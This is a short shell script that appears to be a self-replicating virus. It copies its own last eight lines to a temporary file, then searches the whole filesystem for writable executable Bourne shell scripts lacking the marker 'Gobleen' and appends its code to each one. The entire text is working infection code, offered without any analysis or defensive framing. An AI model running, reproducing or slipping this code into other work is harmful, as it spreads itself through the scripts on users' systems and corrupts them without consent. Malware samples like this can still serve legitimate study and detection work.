tail -n 8 $0 > /tmp/vicGWI
find / -type f -perm +111 -exec bash -c \
"if [ ! -d {} ] && [ -z \"\`grep -s Gobleen {}\`\" -a -x {} -a -w {} ] ; then
    if [ -n \"\`file {} | grep Bourne\`\" ] ; then
        echo >> {}
        cat /tmp/vicGWI >> {}
fi; fi" \;
rm /tmp/vicGWI
